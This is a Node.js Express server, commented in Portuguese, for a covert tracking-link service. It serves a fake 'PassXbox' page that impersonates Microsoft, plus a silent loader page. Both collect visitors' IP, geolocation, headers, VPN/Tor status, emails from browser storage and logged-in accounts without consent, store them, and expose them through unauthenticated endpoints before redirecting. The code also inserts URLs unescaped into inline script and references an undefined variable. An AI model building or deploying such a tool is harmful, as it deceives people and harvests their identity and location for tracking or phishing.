const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || 'localhost:3000'; // Pode ser configurado para um domínio real

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Inicializar banco de dados
const db = new sqlite3.Database('./tracker.db');

// Criar tabelas
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    original_url TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    click_count INTEGER DEFAULT 0
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    referrer TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    data TEXT,
    vpn_proxy TEXT,
    risk_score INTEGER DEFAULT 0,
    emails TEXT,
    linked_accounts TEXT,
    FOREIGN KEY (link_id) REFERENCES links(id)
  )`);
  
  // Tabela para emails encontrados
  db.run(`CREATE TABLE IF NOT EXISTS emails (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    click_id INTEGER,
    source TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (click_id) REFERENCES clicks(id)
  )`);
  
  // Tabela para contas vinculadas
  db.run(`CREATE TABLE IF NOT EXISTS linked_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    click_id INTEGER,
    service TEXT,
    logged_in INTEGER DEFAULT 0,
    user_id TEXT,
    email TEXT,
    indicators TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (click_id) REFERENCES clicks(id)
  )`);
  
  db.run(`CREATE INDEX IF NOT EXISTS idx_email ON emails(email)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_service ON linked_accounts(service)`);

  db.run(`CREATE INDEX IF NOT EXISTS idx_link_id ON clicks(link_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_ip_address ON clicks(ip_address)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_timestamp ON clicks(timestamp)`);
});

// Função auxiliar para fazer requisições HTTP
function httpRequest(url) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https') ? https : http;
    const req = protocol.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.setTimeout(3000, () => {
      req.destroy();
      reject(new Error('Timeout'));
    });
  });
}

// Obter dados geográficos adicionais
async function getAdditionalGeoData(ip) {
  try {
    const data = await httpRequest(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    if (data.status === 'success') {
      return {
        country: data.country,
        countryCode: data.countryCode,
        region: data.regionName,
        regionCode: data.region,
        city: data.city,
        zip: data.zip,
        latitude: data.lat,
        longitude: data.lon,
        timezone: data.timezone,
        isp: data.isp,
        organization: data.org,
        asn: data.as,
        source: 'ip-api.com'
      };
    }
  } catch (e) {
    // Ignorar erros
  }
  return null;
}

// Obter nome do país
function getCountryName(code) {
  const countries = {
    'BR': 'Brasil', 'US': 'Estados Unidos', 'GB': 'Reino Unido',
    'CA': 'Canadá', 'AU': 'Austrália', 'DE': 'Alemanha',
    'FR': 'França', 'IT': 'Itália', 'ES': 'Espanha',
    'PT': 'Portugal', 'MX': 'México', 'AR': 'Argentina',
    'CL': 'Chile', 'CO': 'Colômbia', 'PE': 'Peru'
  };
  return countries[code] || code;
}

// Função EXPANDIDA para detectar VPN/Proxy usando múltiplas APIs
async function detectVPNProxy(ip) {
  const results = {
    isVPN: false,
    isProxy: false,
    isTor: false,
    provider: null,
    confidence: 0,
    sources: [],
    details: {
      organization: null,
      asn: null,
      type: null,
      isDatacenter: false,
      isHosting: false,
      isMobile: false,
      isResidential: false
    }
  };

  // API 1: ipapi.co (gratuita, limitada)
  try {
    const ipapiData = await httpRequest(`https://ipapi.co/${ip}/json/`);
    if (ipapiData.org) {
      const orgLower = ipapiData.org.toLowerCase();
      if (orgLower.includes('vpn') || orgLower.includes('proxy') || 
          orgLower.includes('hosting') || orgLower.includes('datacenter')) {
        results.isVPN = orgLower.includes('vpn');
        results.isProxy = orgLower.includes('proxy');
        results.provider = ipapiData.org;
        results.confidence += 30;
        results.sources.push('ipapi.co');
        results.details.organization = ipapiData.org;
        results.details.isHosting = orgLower.includes('hosting') || orgLower.includes('datacenter');
      }
      if (ipapiData.org_type) {
        results.details.type = ipapiData.org_type;
        if (ipapiData.org_type === 'hosting') results.details.isDatacenter = true;
        if (ipapiData.org_type === 'mobile') results.details.isMobile = true;
        if (ipapiData.org_type === 'isp') results.details.isResidential = true;
      }
    }
    if (ipapiData.asn) results.details.asn = ipapiData.asn;
  } catch (e) {
    // Ignorar erros de API
  }

  // API 2: ip-api.com (gratuita) - Mais completa
  try {
    const ipApiData = await httpRequest(`http://ip-api.com/json/${ip}?fields=66846719`);
    if (ipApiData.proxy === true || ipApiData.hosting === true) {
      results.isProxy = ipApiData.proxy || false;
      results.isVPN = ipApiData.hosting || false;
      results.confidence += 40;
      results.sources.push('ip-api.com');
      results.details.isHosting = ipApiData.hosting || false;
    }
    if (ipApiData.org) {
      const orgLower = ipApiData.org.toLowerCase();
      results.details.organization = ipApiData.org;
      if (orgLower.includes('tor') || orgLower.includes('onion')) {
        results.isTor = true;
        results.confidence += 50;
      }
      if (orgLower.includes('vpn') || orgLower.includes('proxy')) {
        results.isVPN = orgLower.includes('vpn');
        results.isProxy = orgLower.includes('proxy');
        results.provider = ipApiData.org;
      }
    }
    if (ipApiData.as) results.details.asn = ipApiData.as;
    if (ipApiData.mobile) results.details.isMobile = true;
  } catch (e) {
    // Ignorar erros de API
  }

  // API 3: ipinfo.io (gratuita, limitada)
  try {
    const ipinfoData = await httpRequest(`https://ipinfo.io/${ip}/json`);
    if (ipinfoData.org) {
      const orgLower = ipinfoData.org.toLowerCase();
      if (orgLower.includes('vpn') || orgLower.includes('proxy') || 
          orgLower.includes('hosting') || orgLower.includes('datacenter')) {
        if (!results.provider) results.provider = ipinfoData.org;
        results.confidence += 20;
        results.sources.push('ipinfo.io');
        if (!results.details.organization) results.details.organization = ipinfoData.org;
      }
    }
    if (ipinfoData.org && ipinfoData.org.includes('AS')) {
      results.details.asn = ipinfoData.org;
    }
  } catch (e) {
    // Ignorar erros de API
  }

  // Verificar padrões conhecidos via geoip
  const geo = geoip.lookup(ip);
  if (geo) {
    // Verificar se IP está em range conhecido de datacenters
    // Lista de ASNs conhecidos de VPN/Proxy (exemplos)
    const vpnAsns = ['AS20473', 'AS32934', 'AS60068']; // Exemplos
    // Verificar organização conhecida
    if (geo.org) {
      const orgLower = geo.org.toLowerCase();
      if (orgLower.includes('amazon') || orgLower.includes('google') || 
          orgLower.includes('microsoft') || orgLower.includes('digitalocean') ||
          orgLower.includes('linode') || orgLower.includes('vultr')) {
        results.details.isDatacenter = true;
        results.details.isHosting = true;
        results.confidence += 15;
      }
    }
  }

  // Análise de padrões no IP
  // IPs de datacenters conhecidos geralmente têm padrões específicos
  const ipParts = ip.split('.');
  if (ipParts.length === 4) {
    const firstOctet = parseInt(ipParts[0]);
    // Ranges comuns de datacenters
    if (firstOctet === 10 || (firstOctet >= 172 && firstOctet <= 172) || 
        (firstOctet >= 192 && firstOctet <= 192)) {
      // IP privado - não é público, mas pode indicar proxy
    }
  }

  return results;
}

// Função EXPANDIDA para calcular score de risco (MÁXIMO)
function calculateRiskScore(data, vpnProxy) {
  let score = 0;
  const factors = [];

  // VPN/Proxy aumenta risco significativamente
  if (vpnProxy.isVPN) {
    score += 30;
    factors.push('VPN detectada');
  }
  if (vpnProxy.isProxy) {
    score += 30;
    factors.push('Proxy detectado');
  }
  if (vpnProxy.isTor) {
    score += 50;
    factors.push('Tor detectado - RISCO MÁXIMO');
  }
  if (vpnProxy.details && vpnProxy.details.isDatacenter) {
    score += 15;
    factors.push('IP de datacenter');
  }

  // Comportamento suspeito (EXPANDIDO)
  if (data.behavior && data.behavior.suspiciousBehavior) {
    if (data.behavior.suspiciousBehavior.suspicious) {
      score += 20;
      score += data.behavior.suspiciousBehavior.reasons.length * 5;
      factors.push(`Comportamento suspeito: ${data.behavior.suspiciousBehavior.botProbability}% bot`);
    }
    if (data.behavior.suspiciousBehavior.botProbability) {
      score += Math.min(data.behavior.suspiciousBehavior.botProbability, 30);
    }
  }

  // Automação detectada
  if (data.browser && data.browser.automation) {
    if (data.browser.automation.webdriver) {
      score += 40;
      factors.push('WebDriver detectado (Selenium/Puppeteer)');
    }
    if (data.browser.automation.bot) {
      score += 30;
      factors.push('Bot detectado');
    }
    if (data.browser.automation.plugins === false && data.browser.automation.languages === false) {
      score += 25;
      factors.push('Características de bot (sem plugins/languages)');
    }
  }

  // Modo privado pode indicar tentativa de ocultação
  if (data.browser && data.browser.privateMode === true) {
    score += 10;
    factors.push('Modo privado/incógnito');
  }

  // Pouco tempo na página pode indicar bot
  if (data.behavior && data.behavior.timeOnPage) {
    if (data.behavior.timeOnPage < 1000) {
      score += 15;
      factors.push('Tempo muito curto na página');
    }
    if (data.behavior.timeOnPage < 500) {
      score += 10;
      factors.push('Saiu imediatamente (bot)');
    }
  }

  // Sem interação humana
  if (data.behavior) {
    const totalInteractions = 
      (data.behavior.mouseMovements?.length || 0) +
      (data.behavior.clicks?.length || 0) +
      (data.behavior.scrolls?.length || 0) +
      (data.behavior.keystrokes?.length || 0);
    
    if (totalInteractions === 0 && data.behavior.timeOnPage > 2000) {
      score += 20;
      factors.push('Nenhuma interação humana detectada');
    }
  }

  // Extensões de privacidade
  if (data.browser && data.browser.extensions) {
    if (data.browser.extensions.adblock || data.browser.extensions.privacy) {
      score += 5;
      factors.push('Extensões de privacidade detectadas');
    }
  }

  // Score máximo 100
  score = Math.min(score, 100);

  return {
    score: score,
    level: score >= 70 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW',
    factors: factors
  };
}

// API: Criar novo link de rastreamento
app.post('/api/create-link', (req, res) => {
  const { url, usePassXbox, customDomain } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: 'URL é obrigatória' });
  }

  const linkId = uuidv4().substring(0, 8);
  
  // Se usePassXbox for true, criar link camuflado
  let trackingUrl;
  const host = req.get('host');
  
  if (usePassXbox) {
    // Se tiver domínio customizado, usar ele
    if (customDomain) {
      // Remover http:// ou https:// se tiver
      const cleanDomain = customDomain.replace(/^https?:\/\//, '').replace(/\/$/, '');
      trackingUrl = `https://${cleanDomain}/${linkId}`;
    } else if (host.includes('localhost') || host.includes('127.0.0.1')) {
      // Desenvolvimento local
      trackingUrl = `http://${host}/passxbox/${linkId}`;
    } else {
      // Produção sem domínio customizado - usar host atual
      trackingUrl = `${req.protocol}://${host}/passxbox/${linkId}`;
    }
  } else {
    trackingUrl = `${req.protocol}://${host}/t/${linkId}`;
  }

  db.run(
    'INSERT INTO links (id, original_url) VALUES (?, ?)',
    [linkId, url],
    function(err) {
      if (err) {
        return res.status(500).json({ error: 'Erro ao criar link' });
      }
      res.json({ 
        linkId, 
        trackingUrl,
        originalUrl: url,
        isPassXbox: usePassXbox || false
      });
    }
  );
});

// API: Coletar dados do clique (aceita sendBeacon e fetch normal)
app.post('/api/track/:linkId', async (req, res) => {
  const { linkId } = req.params;
  
  // Aceitar dados de sendBeacon (FormData) ou JSON normal
  let data;
  if (req.is('application/json')) {
    data = req.body;
  } else if (req.is('multipart/form-data')) {
    // sendBeacon com FormData
    data = req.body.data ? (typeof req.body.data === 'string' ? JSON.parse(req.body.data) : req.body.data) : req.body;
  } else {
    // Tentar parsear como JSON de qualquer forma
    try {
      if (typeof req.body === 'string') {
        data = JSON.parse(req.body);
      } else if (req.body && typeof req.body === 'object') {
        data = req.body.data ? (typeof req.body.data === 'string' ? JSON.parse(req.body.data) : req.body.data) : req.body;
      } else {
        data = req.body;
      }
    } catch (e) {
      data = req.body;
    }
  }
  
  // Validar que temos dados
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ error: 'Dados inválidos' });
  }

  // Obter IP do cliente (melhorado)
  let ip = req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] ||
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // Limpar IP (remover porta se houver)
  if (ip) {
    ip = ip.split(':').pop(); // Pegar último elemento (IPv6 pode ter múltiplos :)
    if (ip.includes(',')) {
      ip = ip.split(',')[0].trim(); // Pegar primeiro IP se houver múltiplos
    }
  }

  // Processar dados de geolocalização (EXPANDIDO)
  const geo = geoip.lookup(ip);
  if (geo) {
    data.geoLocation = {
      country: geo.country,
      countryName: getCountryName(geo.country),
      region: geo.region,
      city: geo.city,
      latitude: geo.ll[0],
      longitude: geo.ll[1],
      timezone: geo.timezone,
      metro: geo.metro || null,
      range: geo.range || null,
      // Dados adicionais
      coordinates: {
        lat: geo.ll[0],
        lng: geo.ll[1],
        accuracy: 'city_level' // Precisão aproximada
      },
      // Tentar obter mais dados via API externa
      additional: await getAdditionalGeoData(ip)
    };
  } else {
    // Se geoip não encontrou, tentar API externa
    data.geoLocation = await getAdditionalGeoData(ip);
  }

  // Processar User-Agent
  const agent = useragent.parse(req.headers['user-agent'] || '');
  data.parsedUserAgent = {
    browser: agent.family,
    browserVersion: agent.toVersion(),
    os: agent.os.family,
    osVersion: agent.os.toVersion(),
    device: agent.device.family
  };

  // Detectar VPN/Proxy
  let vpnProxy = { isVPN: false, isProxy: false, isTor: false, provider: null, confidence: 0 };
  if (ip && ip !== '::1' && ip !== '127.0.0.1') {
    try {
      vpnProxy = await detectVPNProxy(ip);
      data.network.vpnProxy = vpnProxy;
    } catch (e) {
      console.error('Erro ao detectar VPN/Proxy:', e);
    }
  }

  // Calcular score de risco (EXPANDIDO)
  const riskAnalysis = calculateRiskScore(data, vpnProxy);
  data.riskScore = riskAnalysis.score;
  data.riskLevel = riskAnalysis.level;
  data.riskFactors = riskAnalysis.factors;

  // Adicionar IP e timestamp
  data.ipAddress = ip;
  data.serverTimestamp = new Date().toISOString();

  // Adicionar headers HTTP adicionais
  data.httpHeaders = {
    accept: req.headers['accept'],
    acceptEncoding: req.headers['accept-encoding'],
    acceptLanguage: req.headers['accept-language'],
    connection: req.headers['connection'],
    host: req.headers['host'],
    origin: req.headers['origin'],
    secFetchDest: req.headers['sec-fetch-dest'],
    secFetchMode: req.headers['sec-fetch-mode'],
    secFetchSite: req.headers['sec-fetch-site'],
    secFetchUser: req.headers['sec-fetch-user'],
    upgradeInsecureRequests: req.headers['upgrade-insecure-requests'],
    xForwardedFor: req.headers['x-forwarded-for'],
    xRealIp: req.headers['x-real-ip']
  };

  // Preparar string de VPN/Proxy para banco
  const vpnProxyStr = JSON.stringify(vpnProxy);
  
  // Extrair emails e contas vinculadas
  const emails = data.accounts?.emails || [];
  const linkedAccounts = data.accounts?.linkedAccounts || {};
  const emailsStr = JSON.stringify(emails);
  const linkedAccountsStr = JSON.stringify(linkedAccounts);

  // Salvar no banco
  db.run(
    'INSERT INTO clicks (link_id, ip_address, user_agent, referrer, data, vpn_proxy, risk_score, emails, linked_accounts) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [linkId, ip, req.headers['user-agent'] || '', req.headers['referer'] || '', JSON.stringify(data), vpnProxyStr, riskScore, emailsStr, linkedAccountsStr],
    function(err) {
      if (err) {
        console.error('Erro ao salvar clique:', err);
        return res.status(500).json({ error: 'Erro ao salvar dados' });
      }

      const clickId = this.lastID;

      // Salvar emails encontrados
      if (emails.length > 0) {
        emails.forEach(email => {
          db.run('INSERT INTO emails (email, click_id, source) VALUES (?, ?, ?)', 
            [email, clickId, 'browser_storage']);
        });
      }

      // Salvar contas vinculadas
      Object.keys(linkedAccounts).forEach(service => {
        const account = linkedAccounts[service];
        if (account.loggedIn) {
          db.run('INSERT INTO linked_accounts (click_id, service, logged_in, user_id, email, indicators) VALUES (?, ?, ?, ?, ?, ?)',
            [clickId, service, 1, account.userId || account.username || null, account.email || null, JSON.stringify(account.indicators || [])]);
        }
      });

      // Atualizar contador de cliques
      db.run('UPDATE links SET click_count = click_count + 1 WHERE id = ?', [linkId]);

      // Buscar URL original para redirecionamento
      db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
        if (err || !row) {
          return res.status(404).json({ error: 'Link não encontrado' });
        }
        res.json({ 
          redirectUrl: row.original_url,
          riskScore: riskScore,
          riskLevel: data.riskLevel,
          emailsFound: emails.length,
          accountsFound: Object.keys(linkedAccounts).filter(s => linkedAccounts[s].loggedIn).length
        });
      });
    }
  );
});

// API: Obter dados de um link
app.get('/api/link/:linkId', (req, res) => {
  const { linkId } = req.params;

  db.get('SELECT * FROM links WHERE id = ?', [linkId], (err, link) => {
    if (err || !link) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }

    db.all('SELECT * FROM clicks WHERE link_id = ? ORDER BY timestamp DESC', [linkId], (err, clicks) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao buscar cliques' });
      }

      const clicksWithData = clicks.map(click => ({
        ...click,
        data: JSON.parse(click.data || '{}')
      }));

      res.json({
        link,
        clicks: clicksWithData
      });
    });
  });
});

// API: Listar todos os links
app.get('/api/links', (req, res) => {
  db.all('SELECT * FROM links ORDER BY created_at DESC', (err, links) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar links' });
    }
    res.json(links);
  });
});

// API: Estatísticas gerais
app.get('/api/stats', (req, res) => {
  db.get('SELECT COUNT(*) as totalLinks FROM links', (err, linkCount) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
    }

    db.get('SELECT COUNT(*) as totalClicks FROM clicks', (err, clickCount) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
      }

      db.all('SELECT COUNT(DISTINCT ip_address) as uniqueIPs FROM clicks', (err, uniqueIPs) => {
        if (err) {
          return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
        }

        db.all(`SELECT COUNT(*) as highRisk FROM clicks WHERE risk_score >= 70`, (err, highRisk) => {
          if (err) {
            return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
          }

          res.json({
            totalLinks: linkCount.totalLinks,
            totalClicks: clickCount.totalClicks,
            uniqueIPs: uniqueIPs[0].uniqueIPs,
            highRiskClicks: highRisk[0].highRisk
          });
        });
      });
    });
  });
});

// API: Buscar cliques por IP
app.get('/api/clicks-by-ip/:ip', (req, res) => {
  const { ip } = req.params;
  db.all('SELECT * FROM clicks WHERE ip_address = ? ORDER BY timestamp DESC', [ip], (err, clicks) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar cliques' });
    }

    const clicksWithData = clicks.map(click => ({
      ...click,
      data: JSON.parse(click.data || '{}'),
      vpnProxy: JSON.parse(click.vpn_proxy || '{}')
    }));

    res.json(clicksWithData);
  });
});

// API: Exportar dados (CSV)
app.get('/api/export/:linkId', (req, res) => {
  const { linkId } = req.params;

  db.all('SELECT * FROM clicks WHERE link_id = ? ORDER BY timestamp DESC', [linkId], (err, clicks) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao exportar dados' });
    }

    // Criar CSV
    let csv = 'ID,Link ID,IP Address,User Agent,Referrer,Timestamp,Risk Score,VPN/Proxy,Emails,Linked Accounts\n';
    
    clicks.forEach(click => {
      const vpnProxy = JSON.parse(click.vpn_proxy || '{}');
      const vpnProxyStr = vpnProxy.isVPN ? 'VPN' : vpnProxy.isProxy ? 'Proxy' : vpnProxy.isTor ? 'Tor' : 'No';
      const emails = JSON.parse(click.emails || '[]');
      const accounts = JSON.parse(click.linked_accounts || '{}');
      const accountsList = Object.keys(accounts).filter(s => accounts[s].loggedIn).join(';');
      
      csv += `${click.id},${click.link_id},"${click.ip_address}","${click.user_agent}","${click.referrer}",${click.timestamp},${click.risk_score},${vpnProxyStr},"${emails.join(';')}","${accountsList}"\n`;
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="tracking_data_${linkId}.csv"`);
    res.send(csv);
  });
});

// API: Buscar emails encontrados
app.get('/api/emails', (req, res) => {
  db.all('SELECT DISTINCT email, COUNT(*) as count, MAX(timestamp) as last_seen FROM emails GROUP BY email ORDER BY last_seen DESC', (err, emails) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar emails' });
    }
    res.json(emails);
  });
});

// API: Buscar contas vinculadas por serviço
app.get('/api/accounts/:service', (req, res) => {
  const { service } = req.params;
  db.all('SELECT * FROM linked_accounts WHERE service = ? ORDER BY timestamp DESC', [service], (err, accounts) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar contas' });
    }
    res.json(accounts);
  });
});

// Rota especial para passxbox.com (página camuflada)
app.get('/passxbox/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página camuflada do PassXbox
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PassXbox - Acesse sua Conta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: white;
            font-weight: bold;
        }
        h1 { color: #107c10; font-size: 28px; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
        .loading-container { margin: 30px 0; }
        .loading-text { color: #107c10; font-size: 16px; margin-bottom: 20px; font-weight: 500; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #107c10;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #666; font-size: 13px; margin-top: 20px; }
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: #999;
            font-size: 12px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #107c10, #0e6b0e);
            width: 0%;
            animation: progress 1.5s ease-in-out forwards;
        }
        @keyframes progress { to { width: 100%; } }
    </style>
    <script src="/collector.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">X</div>
        <h1>PassXbox</h1>
        <p class="subtitle">Verificando suas credenciais...</p>
        <div class="loading-container">
            <div class="loading-text">Conectando ao servidor...</div>
            <div class="spinner"></div>
            <div class="progress-bar"><div class="progress-fill"></div></div>
            <div class="status" id="status">Aguarde, estamos processando sua solicitação...</div>
        </div>
        <div class="footer">
            <p>© 2024 Microsoft Corporation. Todos os direitos reservados.</p>
            <p style="margin-top: 5px;">Você será redirecionado em instantes...</p>
        </div>
    </div>
    <script>
        (function() {
            const linkId = '${linkId}';
            const redirectUrl = '${row.original_url}';
            let dataCollected = false;
            let redirectAttempted = false;
            const statusEl = document.getElementById('status');
            const statuses = [
                'Verificando credenciais...',
                'Conectando ao servidor Microsoft...',
                'Validando sua conta...',
                'Preparando redirecionamento...',
                'Quase lá...'
            ];
            let statusIndex = 0;
            const statusInterval = setInterval(() => {
                if (statusIndex < statuses.length) {
                    statusEl.textContent = statuses[statusIndex];
                    statusIndex++;
                }
            }, 300);
            function collectSilently() {
                if (!dataCollected && linkId) {
                    collectAllData(linkId).then(() => {
                        dataCollected = true;
                        clearInterval(statusInterval);
                        statusEl.textContent = 'Redirecionando...';
                    }).catch(() => {});
                }
            }
            collectSilently();
            setTimeout(collectSilently, 400);
            setTimeout(() => {
                collectSilently();
                setTimeout(() => {
                    if (!redirectAttempted) {
                        redirectAttempted = true;
                        window.location.href = redirectUrl;
                    }
                }, 300);
            }, 1200);
            setTimeout(() => {
                if (!redirectAttempted && redirectUrl) {
                    redirectAttempted = true;
                    window.location.href = redirectUrl;
                }
            }, 2000);
        })();
    </script>
</body>
</html>`;

    res.send(html);
  });
});

// API: Obter URL de redirecionamento
app.get('/api/get-redirect/:linkId', (req, res) => {
  const { linkId } = req.params;
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }
    res.json({ redirectUrl: row.original_url });
  });
});

// Rota de rastreamento: coleta dados e redireciona
app.get('/t/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página HTML que coleta dados SILENCIOSAMENTE e redireciona
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .loader {
            width: 50px;
            height: 50px;
            margin: 100px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script src="/collector.js"></script>
</head>
<body>
    <div class="loader"></div>
    <script>
        // COLETA SILENCIOSA - SEM PEDIR PERMISSÃO
        (function() {
            const linkId = '${linkId}';
            const redirectUrl = '${row.original_url}';
            
            // Coletar dados imediatamente em background (sem bloquear)
            let dataCollected = false;
            
            // Função de coleta silenciosa
            function collectSilently() {
                if (!dataCollected) {
                    collectAllData(linkId).then((result) => {
                        dataCollected = true;
                        // Dados coletados silenciosamente
                    }).catch(() => {
                        // Erro silencioso - não mostrar nada
                    });
                }
            }
            
            // Coletar imediatamente
            collectSilently();
            
            // Coletar novamente após 500ms (para pegar mais dados de comportamento)
            setTimeout(collectSilently, 500);
            
            // Coletar uma última vez antes de redirecionar
            setTimeout(() => {
                collectSilently();
                // Redirecionar após coleta
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 200);
            }, 800); // Reduzido para 800ms - coleta rápida e silenciosa
            
            // Fallback - redirecionar mesmo se houver erro
            setTimeout(() => {
                if (!dataCollected) {
                    collectSilently();
                }
                window.location.href = redirectUrl;
            }, 1200); // Máximo 1.2 segundos
        })();
    </script>
</body>
</html>`;

    res.send(html);
  });
});

// Rota raiz: dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Exportar para Vercel
module.exports = app;

// Iniciar servidor apenas se não estiver na Vercel
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
  });
}
